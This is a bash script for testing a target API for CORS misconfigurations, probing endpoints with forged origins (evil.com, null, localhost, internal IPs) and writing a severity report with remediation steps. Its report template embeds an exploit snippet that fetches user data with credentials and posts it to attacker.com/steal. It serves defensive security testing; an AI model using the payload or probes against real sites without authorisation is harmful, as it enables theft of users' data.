#!/bin/bash
# CORS Security Testing Script
# Tests for CORS misconfigurations that allow credential-based attacks

TARGET="${1:-api.example.com}"
OUTPUT_DIR="${2:-/tmp/redteam-cors}"

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "=== CORS Security Testing for $TARGET ==="
echo ""

# ============================================================
# Test Origins
# ============================================================
declare -a TEST_ORIGINS=(
    # Direct evil domains
    "https://evil.com"
    "https://attacker.com"
    "https://malicious.com"
    
    # Null origin (can be achieved via data: URLs, sandboxed iframes)
    "null"
    
    # Subdomain hijacking attempts
    "https://evil.$TARGET"
    "https://test.$TARGET.evil.com"
    "https://$TARGET.evil.com"
    
    # Protocol variations
    "http://$TARGET"
    "https://www.$TARGET"
    
    # Suffix matching bypass attempts
    "https://not$TARGET"
    "https://${TARGET}evil.com"
    "https://evil${TARGET}"
    
    # Unicode/encoding tricks
    "https://%65%76%69%6c.com"  # evil.com encoded
    
    # Localhost variations (internal access)
    "http://localhost"
    "http://127.0.0.1"
    "http://[::1]"
    "http://localhost:3000"
    
    # Internal network
    "http://192.168.1.1"
    "http://10.0.0.1"
    "http://172.16.0.1"
)

# ============================================================
# Endpoints to Test
# ============================================================
declare -a TEST_ENDPOINTS=(
    "/"
    "/api"
    "/api/v1"
    "/user"
    "/users"
    "/user_dashboard"
    "/auth"
    "/graphql"
)

# ============================================================
# Test Function
# ============================================================
test_cors() {
    local url="$1"
    local origin="$2"
    
    # Make request with Origin header
    local response
    response=$(curl -sI "$url" \
        -H "Origin: $origin" \
        --connect-timeout 5 2>/dev/null)
    
    # Extract CORS headers
    local acao=$(echo "$response" | grep -i "^access-control-allow-origin:" | tr -d '\r')
    local acac=$(echo "$response" | grep -i "^access-control-allow-credentials:" | tr -d '\r')
    local acam=$(echo "$response" | grep -i "^access-control-allow-methods:" | tr -d '\r')
    local acah=$(echo "$response" | grep -i "^access-control-allow-headers:" | tr -d '\r')
    
    # Analyze vulnerability
    local vuln=""
    local severity=""
    
    if [ -n "$acao" ]; then
        local acao_value=$(echo "$acao" | cut -d':' -f2- | tr -d ' ')
        local acac_value=$(echo "$acac" | cut -d':' -f2- | tr -d ' ' | tr '[:upper:]' '[:lower:]')
        
        # Check if origin is reflected
        if [[ "$acao_value" == "$origin" ]]; then
            if [[ "$acac_value" == "true" ]]; then
                vuln="CRITICAL: Origin reflected with credentials allowed"
                severity="CRITICAL"
            else
                vuln="HIGH: Origin reflected (but no credentials)"
                severity="HIGH"
            fi
        elif [[ "$acao_value" == "*" ]]; then
            if [[ "$acac_value" == "true" ]]; then
                # This is actually invalid per spec, but some servers do it
                vuln="CRITICAL: Wildcard with credentials (invalid but dangerous)"
                severity="CRITICAL"
            else
                vuln="MEDIUM: Wildcard origin allowed"
                severity="MEDIUM"
            fi
        elif [[ "$acao_value" == "null" ]] && [[ "$origin" == "null" ]]; then
            if [[ "$acac_value" == "true" ]]; then
                vuln="HIGH: Null origin accepted with credentials"
                severity="HIGH"
            else
                vuln="MEDIUM: Null origin accepted"
                severity="MEDIUM"
            fi
        fi
    fi
    
    echo "${severity:-SAFE}|$url|$origin|${vuln:-No CORS misconfiguration}|$acao|$acac"
}

# ============================================================
# Run Tests
# ============================================================
echo "# CORS Security Test Results" > cors-results.md
echo "" >> cors-results.md
echo "**Target:** $TARGET" >> cors-results.md
echo "**Date:** $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> cors-results.md
echo "" >> cors-results.md

echo "## Test Matrix" >> cors-results.md
echo "" >> cors-results.md
echo "| Severity | URL | Origin Tested | Finding | ACAO Header | ACAC Header |" >> cors-results.md
echo "|----------|-----|---------------|---------|-------------|-------------|" >> cors-results.md

findings=()

for endpoint in "${TEST_ENDPOINTS[@]}"; do
    url="https://$TARGET$endpoint"
    
    for origin in "${TEST_ORIGINS[@]}"; do
        result=$(test_cors "$url" "$origin")
        severity=$(echo "$result" | cut -d'|' -f1)
        
        if [ "$severity" != "SAFE" ]; then
            url_part=$(echo "$result" | cut -d'|' -f2)
            origin_part=$(echo "$result" | cut -d'|' -f3)
            finding=$(echo "$result" | cut -d'|' -f4)
            acao=$(echo "$result" | cut -d'|' -f5)
            acac=$(echo "$result" | cut -d'|' -f6)
            
            echo "| **$severity** | $url_part | $origin_part | $finding | $acao | $acac |" >> cors-results.md
            findings+=("$result")
        fi
    done
done

echo "" >> cors-results.md

# ============================================================
# Preflight Testing
# ============================================================
echo "## Preflight (OPTIONS) Test" >> cors-results.md
echo "" >> cors-results.md

preflight_result=$(curl -sI "https://$TARGET/api" \
    -X OPTIONS \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: X-Custom-Header, Authorization" \
    --connect-timeout 5 2>/dev/null)

echo "Request:" >> cors-results.md
echo '```' >> cors-results.md
echo "OPTIONS /api HTTP/1.1" >> cors-results.md
echo "Origin: https://evil.com" >> cors-results.md
echo "Access-Control-Request-Method: POST" >> cors-results.md
echo "Access-Control-Request-Headers: X-Custom-Header, Authorization" >> cors-results.md
echo '```' >> cors-results.md
echo "" >> cors-results.md

echo "Response Headers:" >> cors-results.md
echo '```' >> cors-results.md
echo "$preflight_result" | grep -iE "access-control|vary" >> cors-results.md
echo '```' >> cors-results.md
echo "" >> cors-results.md

# ============================================================
# Summary
# ============================================================
echo "## Summary" >> cors-results.md
echo "" >> cors-results.md

critical_count=$(grep -c "CRITICAL" cors-results.md 2>/dev/null || echo 0)
high_count=$(grep -c "| \*\*HIGH" cors-results.md 2>/dev/null || echo 0)
medium_count=$(grep -c "| \*\*MEDIUM" cors-results.md 2>/dev/null || echo 0)

echo "| Severity | Count |" >> cors-results.md
echo "|----------|-------|" >> cors-results.md
echo "| 🔴 CRITICAL | $critical_count |" >> cors-results.md
echo "| 🟠 HIGH | $high_count |" >> cors-results.md
echo "| 🟡 MEDIUM | $medium_count |" >> cors-results.md
echo "" >> cors-results.md

# Critical finding explanation
if [ "$critical_count" -gt 0 ]; then
    echo "### ⚠️ CRITICAL: CORS Allows Credential-Based Cross-Origin Requests" >> cors-results.md
    echo "" >> cors-results.md
    echo "The API reflects arbitrary origins in the \`Access-Control-Allow-Origin\` header" >> cors-results.md
    echo "AND sets \`Access-Control-Allow-Credentials: true\`." >> cors-results.md
    echo "" >> cors-results.md
    echo "**Impact:** Any website on the internet can make authenticated API requests on behalf" >> cors-results.md
    echo "of logged-in users. If a user visits a malicious webpage while logged into $TARGET," >> cors-results.md
    echo "that page's JavaScript can silently:" >> cors-results.md
    echo "- Read user data" >> cors-results.md
    echo "- Steal API tokens" >> cors-results.md
    echo "- Modify account settings" >> cors-results.md
    echo "- Access billing information" >> cors-results.md
    echo "" >> cors-results.md
    echo "**Exploit Example:**" >> cors-results.md
    echo '```html' >> cors-results.md
    echo '<script>' >> cors-results.md
    echo "fetch('https://$TARGET/user_dashboard/users/', {" >> cors-results.md
    echo "  credentials: 'include'" >> cors-results.md
    echo '})' >> cors-results.md
    echo '.then(r => r.json())' >> cors-results.md
    echo ".then(data => fetch('https://attacker.com/steal', {" >> cors-results.md
    echo '  method: "POST",' >> cors-results.md
    echo '  body: JSON.stringify(data)' >> cors-results.md
    echo '}));' >> cors-results.md
    echo '</script>' >> cors-results.md
    echo '```' >> cors-results.md
    echo "" >> cors-results.md
    echo "**Remediation:**" >> cors-results.md
    echo "1. Whitelist specific trusted origins instead of reflecting the Origin header" >> cors-results.md
    echo "2. Never combine \`Access-Control-Allow-Credentials: true\` with a wildcard or reflected origin" >> cors-results.md
    echo "3. Validate the Origin header against an allowlist before reflecting it" >> cors-results.md
fi

# ============================================================
# Output
# ============================================================
cat cors-results.md

echo ""
echo "Full results saved to: $OUTPUT_DIR/cors-results.md"
